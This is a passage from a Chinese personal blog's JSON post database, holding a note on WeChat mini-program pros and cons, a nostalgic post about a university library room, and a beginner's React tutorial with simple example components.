title=\"优点\"></a>优点</h1><ul>\n<li><strong>HTML5是未来，腾讯帮助整个生态系统往前走了一大步。</strong></li>\n<li>腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。</li>\n<li>有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。</li>\n<li>开发简单，入门门槛低。</li>\n</ul>\n<h1 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h1><ul>\n<li>不支持引用js，比如jquery等众多优秀的js插件。</li>\n<li>可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。</li>\n<li>随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。</li>\n<li>没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我想用一句名言总结一下前端趋势及未来App趋势：</p>\n<blockquote>\n<p>Any application that can be written in JavaScript, will eventually be written in JavaScript.</p>\n</blockquote>\n<p>腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。</p>\n<p>不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。</p>"},{"title":"我怀念的依旧是916","id":"13","updated":"2016-08-21T00:09:45.000Z","date":"2016-08-20T22:22:01.000Z","_content":"\n本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。\n\n所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。\n\n916桌子很多，却都是空位，但是有基友陪伴。\n<!-- more --> \n![](/content/images/2016/08/IMG_0052.JPG)\n\n916有dong dong dong，充满回忆。\n![](/content/images/2016/08/IMG_0310.JPG)\n![](/content/images/2016/08/IMG_0798.JPG)\n\n916从来不用占座，却可以假装学习。\n![](/content/images/2016/08/IMG_1133.JPG)\n![](/content/images/2016/08/IMG_1131.JPG)\n\n916通宵加零食，空调WI-FI感觉人生圆满了。\n![](/content/images/2016/08/IMG_0912.JPG)\n\n916有沙发有地铺，住在学校里的快捷酒店。\n![](/content/images/2016/08/IMG_0459.JPG)\n\n916极大地方便了生活，Linux的帮忙少不了。\n![](/content/images/2016/08/IMG_0502-1.JPG)\n\n或许我想念的并不是不太优越的办公环境，而是那种感觉。\n\n炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。\n\n自由自在，想做什么做什么。\n\n当然，我也不会忘记，\n\n偷偷的把被子塞到书包里，绕过防火墙的经历；\n\n第二天起床去厕所刷牙碰到老师，被吓住的心情；\n\n晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；\n\n十点后进入害怕遇到搜查，爬九楼的故事；\n\n隔壁传来的dongdongdong声音和30GB的故事。\n\n","source":"_posts/我怀念的依旧是916.md","raw":"---\ntitle: 我怀念的依旧是916\ntags: '杂谈'\npermalink: '916'\nid: 13\nupdated: '2016-08-21 01:09:45'\ndate: 2016-08-20 23:22:01\n---\n\n本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。\n\n所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。\n\n916桌子很多，却都是空位，但是有基友陪伴。\n<!-- more --> \n![](/content/images/2016/08/IMG_0052.JPG)\n\n916有dong dong dong，充满回忆。\n![](/content/images/2016/08/IMG_0310.JPG)\n![](/content/images/2016/08/IMG_0798.JPG)\n\n916从来不用占座，却可以假装学习。\n![](/content/images/2016/08/IMG_1133.JPG)\n![](/content/images/2016/08/IMG_1131.JPG)\n\n916通宵加零食，空调WI-FI感觉人生圆满了。\n![](/content/images/2016/08/IMG_0912.JPG)\n\n916有沙发有地铺，住在学校里的快捷酒店。\n![](/content/images/2016/08/IMG_0459.JPG)\n\n916极大地方便了生活，Linux的帮忙少不了。\n![](/content/images/2016/08/IMG_0502-1.JPG)\n\n或许我想念的并不是不太优越的办公环境，而是那种感觉。\n\n炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。\n\n自由自在，想做什么做什么。\n\n当然，我也不会忘记，\n\n偷偷的把被子塞到书包里，绕过防火墙的经历；\n\n第二天起床去厕所刷牙碰到老师，被吓住的心情；\n\n晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；\n\n十点后进入害怕遇到搜查，爬九楼的故事；\n\n隔壁传来的dongdongdong声音和30GB的故事。\n\n","slug":"916","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xp3002y5es5tshwnecc","content":"<p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>\n<p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>\n<p>916桌子很多，却都是空位，但是有基友陪伴。<br><a id=\"more\"></a><br><img src=\"/content/images/2016/08/IMG_0052.JPG\" alt=\"\"></p>\n<p>916有dong dong dong，充满回忆。<br><img src=\"/content/images/2016/08/IMG_0310.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_0798.JPG\" alt=\"\"></p>\n<p>916从来不用占座，却可以假装学习。<br><img src=\"/content/images/2016/08/IMG_1133.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_1131.JPG\" alt=\"\"></p>\n<p>916通宵加零食，空调WI-FI感觉人生圆满了。<br><img src=\"/content/images/2016/08/IMG_0912.JPG\" alt=\"\"></p>\n<p>916有沙发有地铺，住在学校里的快捷酒店。<br><img src=\"/content/images/2016/08/IMG_0459.JPG\" alt=\"\"></p>\n<p>916极大地方便了生活，Linux的帮忙少不了。<br><img src=\"/content/images/2016/08/IMG_0502-1.JPG\" alt=\"\"></p>\n<p>或许我想念的并不是不太优越的办公环境，而是那种感觉。</p>\n<p>炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。</p>\n<p>自由自在，想做什么做什么。</p>\n<p>当然，我也不会忘记，</p>\n<p>偷偷的把被子塞到书包里，绕过防火墙的经历；</p>\n<p>第二天起床去厕所刷牙碰到老师，被吓住的心情；</p>\n<p>晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；</p>\n<p>十点后进入害怕遇到搜查，爬九楼的故事；</p>\n<p>隔壁传来的dongdongdong声音和30GB的故事。</p>\n","excerpt":"<p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>\n<p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>\n<p>916桌子很多，却都是空位，但是有基友陪伴。<br>","more":"<br><img src=\"/content/images/2016/08/IMG_0052.JPG\" alt=\"\"></p>\n<p>916有dong dong dong，充满回忆。<br><img src=\"/content/images/2016/08/IMG_0310.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_0798.JPG\" alt=\"\"></p>\n<p>916从来不用占座，却可以假装学习。<br><img src=\"/content/images/2016/08/IMG_1133.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_1131.JPG\" alt=\"\"></p>\n<p>916通宵加零食，空调WI-FI感觉人生圆满了。<br><img src=\"/content/images/2016/08/IMG_0912.JPG\" alt=\"\"></p>\n<p>916有沙发有地铺，住在学校里的快捷酒店。<br><img src=\"/content/images/2016/08/IMG_0459.JPG\" alt=\"\"></p>\n<p>916极大地方便了生活，Linux的帮忙少不了。<br><img src=\"/content/images/2016/08/IMG_0502-1.JPG\" alt=\"\"></p>\n<p>或许我想念的并不是不太优越的办公环境，而是那种感觉。</p>\n<p>炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。</p>\n<p>自由自在，想做什么做什么。</p>\n<p>当然，我也不会忘记，</p>\n<p>偷偷的把被子塞到书包里，绕过防火墙的经历；</p>\n<p>第二天起床去厕所刷牙碰到老师，被吓住的心情；</p>\n<p>晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；</p>\n<p>十点后进入害怕遇到搜查，爬九楼的故事；</p>\n<p>隔壁传来的dongdongdong声音和30GB的故事。</p>"},{"title":"我眼中的React","date":"2017-02-04T14:35:03.000Z","header-img":"/content/images/react/wall.png","_content":"\n前两天，用React把 之前的 [基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测系统](https://github.com/yfgeek/rpi-TempRuntime) 的Web部分重构了一下。\n\n这个项目之前是用Semantic UI + eCharts + JQuery Datapicker写的，由于这个项目的实现过程比较经典，几乎把所有的感觉React的基础思想都实现了一遍。\n\n无疑，React给前端带来了各种新的想法与思想，声明式、虚拟Dom、单向数据流、JSX、组件化、Flux、以JavaScript为中心、React Native。\n\n![](/content/images/react/0.png)\n\n# 虚拟Dom\nReact是以JS为中心的，而非HTML，虚拟Dom是一个至关重要的概念。\n\n在jQuery出现之前，我们一般都是直接操作Dom，方法“暴力、简单”，也存在兼容性的问题。在jQuery出现之后，jQuery的选择器帮助我们简单、高效的操作Dom，也就是在jQuery出现之后，前端就开始大爆发了。\n\n但是随着发展，这种简单暴力的操作Dom的方法对于很多大型系统性工程来说，从软件工程的角度上讲，是杂乱、无序的，一旦时间久远，项目越来越大，维护成本就变大。于是，我们有了各种前端MVC、MVVM框架，典型的有Angular、React、vue.js，MVVM给我们带来一种全新的思想，数据绑定。\n\n不过，与此同时，React给我们带来了一种全新的思想，虚拟Dom，从此，我们再也不用直接操作Dom了，而是用虚拟Dom更新Dom。\n\n你可能会问，这样做，效率岂不是更低了？\n\n是的，也不是。其实没有那么明显，一般来讲，操作Dom树的Diff算法应该是O(n^3)，而React把效率降低到了O(n)。\n\n![](/content/images/react/1.png)\n\n简单来讲，如图所示，React只会比较相同层级的Dom，从而简化了Dom Diff的复杂度，虽然有所舍弃，但是全局比较是没有必要的。\n\n通过在JSX文件中写虚拟Dom，React在内存中会自动拿现在的虚拟Dom和旧的虚拟Dom进行Diff操作，如果发现有Diff的部分，就拿出来形成新的Patch部分，加入到现在的Dom树上。\n\n也就是因为这个原因，虚拟Dom使得在操作Dom上更加高效，每次更新数据不会进行O(n^3)复杂的操作。\n\n你可能会问，什么是JSX？\n\n# JSX\n\n其实JSX只是一种未编译的JavaScript，可以方便的对HTML进行书写，先上代码：\n\n```javascript\nimport React from 'react';\nimport { Button } from 'semantic-ui-react';\n\nclass ButtonComponent extends React.Component {\n    render() {\n        return(\n            <span>\n            <Button color='blue' >分钟</Button>\n            <Button color='violet'>小时</Button>\n            </span>\n        );\n    }\n}\n\nexport default ButtonComponent;\n```\n代码部分用`ES6`书写，你可能会问什么是ES6？其实还有ES7(ECMAScript 2016)呢~\n\n那么，你可能看到了很变态的写法，就是HTML和JS混写，没错，这就是EJS，但请注意，这不是HTML，写着写着很有可能会掉入[JSX陷阱](http://www.css88.com/react/docs/jsx-gotchas.html)。\n\n经过`babel`等工具的编译后，JSX在运行的时候会被编译为真实的JavaScript语言，之所以这样写，只是为了方便程序员更方便的写代码。\n\n比如上面的代码“HTML部分”会被编译为：\n\n```javascript\nReact.createElement('button', {class: 'ui blue button'}, '分钟');\nReact.createElement('button', {class: 'ui violet button'}, '小时');\n```\n\n当然，JSX也有很多坑，比如：\n\n`Module build failed: SyntaxError: Adjacent JSX elements must be wrapped in an enclosing tag`\n\n作为新手，这个问题，我经常遇到，因为你在写每一个JSX模块的时候，你需要用类似于``<div></div>``作为开始与结尾，不规范的代码不会被编译成功。\n\n# ECMAScript(ES)\n\nES无疑是这几年最火的前端语言，没错，他是JavaScript的改进版，我知道，其实还有很多其他类似的比如CoffeeScript，但是ES会被各大浏览器所兼容支持，但是你可能会问到兼容性问题，没事，我们有`babel`工具。\n\n* ECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。\n* JavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。\n* ECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。\n* ECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。\n* ECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。\n* ECMAScript 2016：第七版 ECMAScript 修订，增加了两个新特性。\n\n以上，都是我们常说的ES，在网上看到的代码目前以ES5和ES6居多，写法各异，我建议用最新版的写法写代码。\n\n说白了，就是Javascript并不是一个优秀的语言，但是经过不断的填补，修正，已经让Javascript支持了很多新特性，新的语法，更多的书写方式，以及拥有了更严谨的编程思想。比如``let``,arrow function(就是这个：`(i) => i + 1` )在ES中的运用等。\n\n所以，在认识React之前，最好学习ES的新特性以及[常用的新特性](http://blog.csdn.net/zhangjjie0110/article/details/53782537)。\n\n# 组件化\n\n我觉得这是React的重量级思想，组件化前端，从此，前端再也不是东拼西凑，而是像积木一样，拼起来。\n\n![](/content/images/react/2.png)\n\nReact把单一的用户界面，拆成了各种各样的组件，形成“组件树”，采用分而治之的思想，有一个好处，就是维护起来极其方便，对于组件的修改也显得很容易。\n\n# 数据绑定\n\n众所周知，Angular是双向数据绑定的，并且引以为豪，因为更容易维护与理解。\n\n但是双向数据绑定也带来了许多问题，会在些其他功能的时候莫名其妙出现很多bug。\n\nReact是单向数据绑定的，是非常稳定的做法，但是也存在一些问题，就是在操作其他组件的时候，对于数据流的处理，显得异常困难。\n\n在React中，数据绑定仅仅需要在`render`中写`{数据绑定}`，而非像Angular一样，两边都要设置，一定情况下讲，这是比较方便的。\n\n\n# 数据模型\n\n## state\n\n话说回来，React的每一个组件的实质是什么？状态机（State Machines），在React的每一个组件里，通过更新`this.state`，再通过`render()`进行渲染，React会自动把最新的状态渲染到网页上。\n\n举个栗子🌰\n```javascript\nclass DateSelectorComponent extends Component {\n\n    constructor(props) {\n    super(props);\n    let todaydate = this.showLocale(new Date());\n     this.state = {\n         timenow: todaydate,\n         showCalendar: false\n    }\n            return(\n            <div>\n            <Input icon='calendar' iconPosition='left' readOnly onClick={this.showCalendar} value={this.state.timenow} ref=\"inputbox\"/>\n            <ButtonComponent />\n            {CalendarComponent}\n            </div>\n        )\n}\n```\n通过这样的方式，我就设置了state的默认初始值，默认日历选择器是不出现的，而今天的日期是今天日期，这很正常。然后在将所谓的值渲染到Dom上。\n\n## props\n\nReact的数据流是单向的，是自上向下的层级传递的，props可以对固定的数据进行传递。\n\n```javascript\nclass HelloMessage extends Component {\n  render( \n    return <h1>Hello {this.props.name}</h1>;\n    )\n}\n\nclass MainPage extends Component {\nrender(){\n return(\n  <HelloMessage name=\"John\" />\n  )\n }\n}\n```\n在这种情况下，子组件会自动读取出父组件传递过来的`props`值John，并快速的渲染在页面上。\n\n## 到底谁是谁\n\n`state`和`props`看起来很相似，其实是完全不同的东西。\n\n| 问题             | _props_ | _state_ |      |\n| -------------- | ------- | ------- | ---- |\n| 可以从父组件得到初始值吗？  | 可以      | 可以      |      |\n| 可以被父组件改变值吗？    | 可以      | 不可以     |      |\n| 可以设置组件内部的初始值吗？ | 可以      | 可以      |      |\n| 可以改变组件内部的初始值吗？ | 不可以     | 可以      |      |\n| 可以设置子组件的初始值吗？  | 可以      | 可以      |      |\n| 可以改变子组件的初始值吗？  | 可以      | 不可以     |      |\n\n按照我的个人理解，`props`是静态的，存入不变量，比如 购物车里的 商品名称、价格；`state`是动态的，存入随时变化的量，比如 用户购买商品的总价，购买数目。\n\n从操作的角度上讲，`props`是单向传递的，会一直被传递到子组件，而`state`更倾向于自身，只能改变自身的值。\n\n# 获取Dom\n\n``this.refs``是react的重要组成之一，通过该方法可以快速高效的获取Dom。\n\n例如，在JSX代码中这样写道\n```html\n  <input ref=\"myInput\" />\n```\n便可以通过\n```javascript\n  this.refs.myInput.value\n```\n命令获取该Input下的dom属性的value值，非常方便。\n\n# 生命周期\n\n组件都是有生命周期的，生命周期内，`props`和`state`改变会导致React自动用Diff算法重新渲染页面。那么生命周期到底都有哪些呢？\n\n大体上分为三类：\n\n* 挂载： 组件被插入到DOM中。\n* 更新： 组件被重新渲染，查明DOM是否应该刷新。\n* 移除： 组件从DOM中移除。\n\n从流程上讲，是这样的：\n\n**挂载期：**\n\ngetInitialState() -->> componentWillMount() -->> render() -->> componentDidMount()\n\n**更新期：**\n\ncomponentWillReceiveProps() -->> shouldComponentUpdate() -->> componentWillUpdate render() -->> componentDidUpdate()\n\n**移除期：**\n\ncomponentWillUnmount()\n\n\n## 挂载\n\n**componentWillMount()**： 在初次渲染之前执行一次，最早的执行点\n\n**componentDidMount()**： 在初次渲染之后执行，比较常用，比如持续执行某事件：\n\n```JavaScript\n    componentDidMount(){\n     setInterval(this.loadData(this.state.date),1000);\n    }\n```\n\n## 更新\n\n**componentWillReceiveProps()**： 在组件接收到新的 `props` 的时候调用。在初始化渲染的时候，该方法不会调用。\n\n**shouldComponentUpdate()**： 在接收到新的 `props` 或者 `state`，将要渲染之前调用。\n\n**componentWillUpdate()**： 在接收到新的 props 或者 state 之前立刻调用。\n\n**componentDidUpdate()**： 在组件的更新已经同步到 DOM 中之后立刻被调用。\n\n## 移除\n\n**componentWillUnmount()**： 在组件从 DOM 中移除的时候立刻被调用。\n\n\n# Flux\n\nReact是MVC中V的一部分，而Flux则是M和C的部分，Flux是单向数据流，符合React的核心思想，不过，Flux并不完善，是一个很松散的架构。\n\n* Dispatcher： 处理动作分发，维护 Store 之间的依赖关系\n* Store： 数据和逻辑部分\n* View： React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互\n* Action： 提供给 Dispatcher 传递数据给 Store\n\n![](/content/images/react/3.png)\n\n\n# Redux\n\n![](/content/images/react/5.jpeg)\n\nFlux把总架构都搭好了，可是实现起来并不容易，因为Flux并没有强大的API，只是一种纯粹的思想实现，而Redux是Flux的“升级版”，把各个部分更加方便的实现起来。\n\n\n此部分未完待续\n\n# 总结\n\n我觉得React给前端开发带来了一种全新的思想，那就是以JS为中心，一种全新的世界。\n\n网页不再是网页，而是像工程一样，一块块搭建起来的，拆下来，搬上去都很容易，似的前端再也不是那个凌乱拼凑的年代。\n\n我想任何一种编程语言，无论是解释性、脚本、编译语言都逃离不了这个全新的年代，就是组件化，大家似乎都在不同方向发展，但实际上，确实一样的。\n\n# 相关阅读\n\n[深入浅出React（四）：虚拟DOM Diff算法解析](http://www.infoq.com/cn/articles/react-dom-diff)\n\n[React/React Native 的ES5 ES6写法对照表](http://bbs.reactnative.cn/topic/15/react-react-native-%E7%9A%84es5-es6%E5%86%99%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8/2)\n\n[React组件声明周期过程说明](https://www.cllgeek.com/archives/544)","source":"_posts/我眼中的React.md","raw":"---\ntitle: 我眼中的React\ndate: 2017-02-04 14:35:03\npermalink: react\ntags: Web\ncategories: Web\nheader-img: \"/content/images/react/wall.png\"\n\n---\n\n前两天，用React把 之前的 [基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测系统](https://github.com/yfgeek/rpi-TempRuntime) 的Web部分重构了一下。\n\n这个项目之前是用Semantic UI + eCharts + JQuery Datapicker写的，由于这个项目的实现过程比较经典，几乎把所有的感觉React的基础思想都实现了一遍。\n\n无疑，React给前端带来了各种新的想法与思想，声明式、虚拟Dom、单向数据流、JSX、组件化、Flux、以JavaScript为中心、React Native。\n\n![](/content/images/react/0.png)\n\n# 虚拟Dom\nReact是以JS为中心的，而非HTML，虚拟Dom是一个至关重要的概念。\n\n在jQuery出现之前，我们一般都是直接操作Dom，方法“暴力、简单”，也存在兼容性的问题。在jQuery出现之后，jQuery的选择器帮助我们简单、高效的操作Dom，也就是在jQuery出现之后，前端就开始大爆发了。\n\n但是随着发展，这种简单暴力的操作Dom的方法对于很多大型系统性工程来说，从软件工程的角度上讲，是杂乱、无序的，一旦时间久远，项目越来越大，维护成本就变大。于是，我们有了各种前端MVC、MVVM框架，典型的有Angular、React、vue.js，MVVM给我们带来一种全新的思想，数据绑定。\n\n不过，与此同时，React给我们带来了一种全新的思想，虚拟Dom，从此，我们再也不用直接操作Dom了，而是用虚拟Dom更新Dom。\n\n你可能会问，这样做，效率岂不是更低了？\n\n是的，也不是。其实没有那么明显，一般来讲，操作Dom树的Diff算法应该是O(n^3)，而React把效率降低到了O(n)。\n\n![](/content/images/react/1.png)\n\n简单来讲，如图所示，React只会比较相同层级的Dom，从而简化了Dom Diff的复杂度，虽然有所舍弃，但是全局比较是没有必要的。\n\n通过在JSX文件中写虚拟Dom，React在内存中会自动拿现在的虚拟Dom和旧的虚拟Dom进行Diff操作，如果发现有Diff的部分，就拿出来形成新的Patch部分，加入到现在的Dom树上。\n\n也就是因为这个原因，虚拟Dom使得在操作Dom上更加高效，每次更新数据不会进行O(n^3)复杂的操作。\n\n你可能会问，什么是JSX？\n\n# JSX\n\n其实JSX只是一种未编译的JavaScript，可以方便的对HTML进行书写，先上代码：\n\n```javascript\nimport React from 'react';\nimport { Button } from 'semantic-ui-react';\n\nclass ButtonComponent extends React.Component {\n    render() {\n        return(\n            <span>\n            <Button color='blue' >分钟</Button>\n            <Button color='violet'>小时</Button>\n            </span>\n        );\n    }\n}\n\nexport default ButtonComponent;\n```\n代码部分用`ES6`书写，你可能会问什么是ES6？其实还有ES7(ECMAScript 2016)呢~\n\n那么，你可能看到了很变态的写法，就是HTML和JS混写，没错，这就是EJS，但请注意，这不是HTML，写着写着很有可能会掉入[JSX陷阱](http://www.css88.com/react/docs/jsx-gotchas.html)。\n\n经过`babel`等工具的编译后，JSX在运行的时候会被编译为真实的JavaScript语言，之所以这样写，只是为了方便程序员更方便的写代码。\n\n比如上面的代码“HTML部分”会被编译为：\n\n```javascript\nReact.createElement('button', {class: 'ui blue button'}, '分钟');\nReact.createElement('button', {class: 'ui violet button'}, '小时');\n```\n\n当然，JSX也有很多坑，比如：\n\n`Module build failed: SyntaxError: Adjacent JSX elements must be wrapped in an enclosing tag`\n\n作为新手，这个问题，我经常遇到，因为你在写每一个JSX模块的时候，你需要用类似于``<div></div>``作为开始与结尾，不规范的代码不会被编译成功。\n\n# ECMAScript(ES)\n\nES无疑是这几年最火的前端语言，没错，他是JavaScript的改进版，我知道，其实还有很多其他类似的比如CoffeeScript，但是ES会被各大浏览器所兼容支持，但是你可能会问到兼容性问题，没事，我们有`babel`工具。\n\n* ECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。\n* JavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。\n* ECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。\n* ECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。\n* ECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。\n* ECMAScript 2016：第七版 ECMAScript 修订，增加了两个新特性。\n\n以上，都是我们常说的ES，在网上看到的代码目前以ES5和ES6居多，写法各异，我建议用最新版的写法写代码。\n\n说白了，就是Javascript并不是一个优秀的语言，但是经过不断的填补，修正，已经让Javascript支持了很多新特性，新的语法，更多的书写方式，以及拥有了更严谨的编程思想。比如``let``,arrow function(就是这个：`(i) => i + 1` )在ES中的运用等。\n\n所以，在认识React之前，最好学习ES的新特性以及[常用的新特性](http://blog.csdn.net/zhangjjie0110/article/details/53782537)。\n\n# 组件化\n\n我觉得这是React的重量级思想，组件化前端，从此，前端再也不是东拼西凑，而是像积木一样，拼起来。\n\n![](/content/images/react/2.png)\n\nReact把单一的用户界面，拆成了各种各样的组件，形成“组件树”，采用分而治之的思想，有一个好处，就是维护起来极其方便，对于组件的修改也显得很容易。\n\n# 数据绑定\n\n众所周知，Angular是双向数据绑定的，并且引以为豪，因为更容易维护与理解。\n\n但是双向数据绑定也带来了许多问题，会在些其他功能的时候莫名其妙出现很多bug。\n\nReact是单向数据绑定的，是非常稳定的做法，但是也存在一些问题，就是在操作其他组件的时候，对于数据流的处理，显得异常困难。\n\n在React中，数据绑定仅仅需要在`render`中写`{数据绑定}`，而非像Angular一样，两边都要设置，一定情况下讲，这是比较方便的。\n\n\n# 数据模型\n\n## state\n\n话说回来，React的每一个组件的实质是什么？状态机（State Machines），在React的每一个组件里，通过更新`this.state`，再通过`render()`进行渲染，React会自动把最新的状态渲染到网页上。\n\n举个栗子🌰\n```javascript\nclass DateSelectorComponent extends Component {\n\n    constructor(props) {\n    super(props);\n    let todaydate = this.showLocale(new Date());\n     this.state = {\n         timenow: todaydate,\n         showCalendar: false\n    }\n            return(\n            <div>\n            <Input icon='calendar' iconPosition='left' readOnly onClick={this.showCalendar} value={this.state.timenow} ref=\"inputbox\"/>\n            <ButtonComponent />\n            {CalendarComponent}\n            </div>\n        )\n}\n```\n通过这样的方式，我就设置了state的默认初始值，默认日历选择器是不出现的，而今天的日期是今天日期，这很正常。然后在将所谓的值渲染到Dom上。\n\n## props\n\nReact的数据流是单向的，是自上向下的层级传递的，props可以对固定的数据进行传递。\n\n```javascript\nclass HelloMessage extends Component {\n  render( \n    return <h1>Hello {this.props.name}</h1>;\n    )\n}\n\nclass MainPage extends Component {\nrender(){\n return(\n  <HelloMessage name=\"John\" />\n  )\n }\n}\n```\n在这种情况下，子组件会自动读取出父组件传递过来的`props`值John，并快速的渲染在页面上。\n\n## 到底谁是谁\n\n`state`和`props`看起来很相似，其实是完全不同的东西。\n\n| 问题             | _props_ | _state_ |      |\n| -------------- | ------- | ------- | ---- |\n| 可以从父组件得到初始值吗？  | 可以      | 可以      |      |\n| 可以被父组件改变值吗？    | 可以      | 不可以     |      |\n| 可以设置组件内部的初始值吗？ | 可以      | 可以      |      |\n| 可以改变组件内部的初始值吗？ | 不可以     | 可以      |      |\n| 可以设置子组件的初始值吗？  | 可以      | 可以      |      |\n| 可以改变子组件的初始值吗？  | 可以      | 不可以     |      |\n\n按照我的个人理解，`props`是静态的，存入不变量，比如 购物车里的 商品名称、价格；`state`是动态的，存入随时变化的量，比如 用户购买商品的总价，购买数目。\n\n从操作的角度上讲，`props`是单向传递的，会一直被传递到子组件，而`state`更倾向于自身，只能改变自身的值。\n\n# 获取Dom\n\n``this.refs``是react的重要组成之一，通过该方法可以快速高效的获取Dom。\n\n例如，在JSX代码中这样写道\n```html\n  <input ref=\"myInput\" />\n```\n便可以通过\n```javascript\n  this.refs.myInput.value\n```\n命令获取该Input下的dom属性的value值，非常方便。\n\n# 生命周期\n\n组件都是有生命周期的，生命周期内，`props`和`state`改变会导致React自动用Diff算法重新渲染页面。那么生命周期到底都有哪些呢？\n\n大体上分为三类：\n\n* 挂载： 组件被插入到DOM中。\n* 更新： 组件被重新渲染，查明DOM是否应该刷新。\n* 移除： 组件从DOM中移除。\n\n从流程上讲，是这样的：\n\n**挂载期：**\n\ngetInitialState() -->> componentWillMount() -->> render() -->> componentDidMount()\n\n**更新期：**\n\ncomponentWillReceiveProps() -->> shouldComponentUpdate() -->> componentWillUpdate render() -->> componentDidUpdate()\n\n**移除期：**\n\ncomponentWillUnmount()\n\n\n## 挂载\n\n**componentWillMount()**： 在初次渲染之前执行一次，最早的执行点\n\n**componentDidMount()**： 在初次渲染之后执行，比较常用，比如持续执行某事件：\n\n```JavaScript\n    componentDidMount(){\n     setInterval(this.loadData(this.state.date),1000);\n    }\n```\n\n## 更新\n\n**componentWillReceiveProps()**： 在组件接收到新的 `props` 的时候调用。在初始化渲染的时候，该方法不会调用。\n\n**shouldComponentUpdate()**： 在接收到新的 `props` 或者 `state`，将要渲染之前调用。\n\n**componentWillUpdate()**： 在接收到新的 props 或者 state 之前立刻调用。\n\n**componentDidUpdate()**： 在组件的更新已经同步到 DOM 中之后立刻被调用。\n\n## 移除\n\n**componentWillUnmount()**： 在组件从 DOM 中移除的时候立刻被调用。\n\n\n# Flux\n\nReact是MVC中V的一部分，而Flux则是M和C的部分，Flux是单向数据流，符合React的核心思想，不过，Flux并不完善，是一个很松散的架构。\n\n* Dispatcher： 处理动作分发，维护 Store 之间的依赖关系\n* Store： 数据和逻辑部分\n* View： React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互\n* Action： 提供给 Dispatcher 传递数据给 Store\n\n![](/content/images/react/3.png)\n\n\n# Redux\n\n![](/content/images/react/5.jpeg)\n\nFlux把总架构都搭好了，可是实现起来并不容易，因为Flux并没有强大的API，只是一种纯粹的思想实现，而Redux是Flux的“升级版”，把各个部分更加方便的实现起来。\n\n\n此部分未完待续\n\n# 